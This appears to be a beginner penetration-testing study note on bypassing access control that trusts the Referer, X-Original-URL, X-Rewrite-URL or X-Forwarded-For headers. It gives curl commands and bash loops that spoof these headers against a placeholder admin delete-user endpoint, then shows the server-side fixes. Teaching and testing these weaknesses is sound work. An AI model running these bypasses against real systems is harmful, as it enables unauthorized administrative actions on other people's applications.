---
tags: [vapt, access-control, beginner]
difficulty: beginner
module: "21 - Access Control"
topic: "21.19 Referrer-Based Access Control Bypass"
portswigger_labs: ["URL-based access control can be circumvented"]
---

# 21.19 — Referrer-Based Access Control Bypass

## What Is Referrer-Based Access Control?

```
SOME APPS CHECK THE REFERER HEADER FOR ACCESS CONTROL:
  
  Logic: "Only allow admin actions if the request came from the admin panel"
  
  Implementation:
  if request.headers.get('Referer') == 'https://app.example.com/admin':
      allow_action()
  else:
      deny_action()
  
  THE FUNDAMENTAL PROBLEM:
  HTTP Referer header is entirely CLIENT-CONTROLLED!
  Anyone can set any Referer they want!
  
  Burp: just add/modify the Referer header
  curl: curl -e "https://app.example.com/admin" /admin/delete-user/42
```

---

## Finding Referer-Based Access Control

```
INDICATORS THAT REFERER IS USED FOR AUTH:
  1. Request to sensitive endpoint → 403
  2. Same request, with Referer → 200!
  
  3. Sensitive actions only work when accessed FROM the admin panel
     (not from direct URL)
  
  4. "You must navigate from the admin dashboard to use this feature"
  
  LOOK FOR:
  Admin → has different access depending on how you navigate to it
  POST actions that only work if submitted from specific pages
  API endpoints that check Referer
  
  TESTING APPROACH:
  1. Find admin action that returns 403 directly
  2. Add Referer: https://target.com/admin
  3. → 200? → Referer-based access control → BYPASS!
```

---

## Testing Referer Bypass

```bash
# STEP 1: FIND ADMIN ENDPOINT (returns 403 for regular user):
curl -s -o /dev/null -w "%{http_code}" \
  -b "session=REGULAR_SESSION" \
  "https://target.com/admin/delete-user?id=43"
# → 403

# STEP 2: ADD REFERER HEADER:
curl -s -o /dev/null -w "%{http_code}" \
  -b "session=REGULAR_SESSION" \
  -e "https://target.com/admin" \       # -e = Referer header in curl
  "https://target.com/admin/delete-user?id=43"
# → 200? → BYPASS!

# ALTERNATIVE REFERER VALUES TO TRY:
REFERERS=(
  "https://target.com/admin"
  "https://target.com/admin/"
  "https://target.com/admin/dashboard"
  "https://target.com/admin/users"
  "https://target.com/internal"
  "http://target.com/admin"
  "https://admin.target.com/"
)

for REFERER in "${REFERERS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "session=REGULAR_SESSION" \
    -H "Referer: $REFERER" \
    "https://target.com/admin/delete-user?id=43")
  echo "$CODE - $REFERER"
done | grep "^200"

# IN BURP REPEATER:
# Add header: Referer: https://target.com/admin
# Forward → check if 403 becomes 200!

# BURP PROXY → MATCH AND REPLACE:
# Add rule: Request header, replace "Referer: .*" → "Referer: https://target.com/admin"
# → Automatically adds/changes Referer on every request → test all endpoints at once!
```

---

## X-Original-URL and X-Rewrite-URL Bypass

```
SIMILAR BYPASS HEADERS:
  Some frameworks read these headers to determine "original URL":
  
  X-Original-URL: /admin
  X-Rewrite-URL: /admin
  
  USAGE: Load balancers, reverse proxies set these when rewriting URLs
  Servers trust them → bypass URL-based access control!
  
  REQUEST:
  GET / HTTP/1.1
  Host: target.com
  X-Original-URL: /admin/users
  
  → Server processes /admin/users based on header
  → But access control checked against URL "/"
  → "/" is public → access control passed
  → Server serves /admin/users content!
  
  TEST:
  GET / HTTP/1.1
  X-Original-URL: /admin
  
  GET /anything HTTP/1.1
  X-Rewrite-URL: /admin/users
  
  → Any 200 response with admin content? → Bypass!
```

---

## X-Custom-IP-Authorization Bypass

```
IP-BASED ACCESS CONTROL:
  Some apps allow admin only from certain IP ranges:
  "Allow if IP is 10.0.0.0/8 (internal network)"
  
  BYPASS HEADERS TO TRY:
  X-Forwarded-For: 127.0.0.1
  X-Forwarded-For: 10.0.0.1
  X-Real-IP: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Originating-IP: 127.0.0.1
  X-Remote-Addr: 127.0.0.1
  X-Client-IP: 127.0.0.1
  Forwarded: for=127.0.0.1
  True-Client-IP: 127.0.0.1
  
  IF SERVER TRUSTS THESE OVER REAL IP:
  → Bypass IP-based access control!
  
  TEST ALL COMBINATIONS:
  for header in "X-Forwarded-For" "X-Real-IP" "X-Remote-IP" "X-Client-IP"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -H "$header: 127.0.0.1" \
      "https://target.com/admin")
    echo "$header: $code"
  done
```

---

## Fix

```
NEVER USE CLIENT-SUPPLIED HEADERS FOR ACCESS CONTROL:

WRONG:
  def admin_delete(user_id):
      referer = request.headers.get('Referer', '')
      if '/admin' in referer:
          do_delete(user_id)
      else:
          abort(403)

WRONG:
  def get_ip():
      return request.headers.get('X-Forwarded-For', request.remote_addr)
  
  if get_ip().startswith('10.'):  # trusts X-Forwarded-For!
      allow_internal_access()

CORRECT:
  def admin_delete(user_id):
      # Check user's role from server-side session — NEVER from headers!
      user = get_current_user()
      if user.role != 'admin':
          abort(403)
      do_delete(user_id)

CORRECT IP CHECK (if needed):
  # Use actual TCP connection IP (remote_addr):
  actual_ip = request.environ.get('REMOTE_ADDR')  # Flask
  # NOT: request.headers.get('X-Forwarded-For')
  
  # Only trust X-Forwarded-For if you know a trusted proxy is setting it:
  # Configure your proxy to strip/rewrite the header before it reaches app!

FOR NGINX (strip client headers before app):
  # Remove any X-Forwarded-For the CLIENT sends:
  proxy_set_header X-Forwarded-For $remote_addr;  # overwrites with real IP!
  # Now app can trust X-Forwarded-For → it's from Nginx, not client

REFERER POLICY:
  Never use Referer for security
  Use it only for analytics (soft check: "was this expected?")
  Security: always check session + role
```

---

## Related Notes
- [[01 - Vertical Privilege Escalation]] — admin access bypasses
- [[11 - Forced Browsing / Unprotected Admin Endpoints]] — finding admin endpoints
- [[14 - Path Traversal to Bypass Access Controls]] — URL path bypass
- [[20 - Defense — Server-Side Authorization, Object-Level Checks]] — full fix
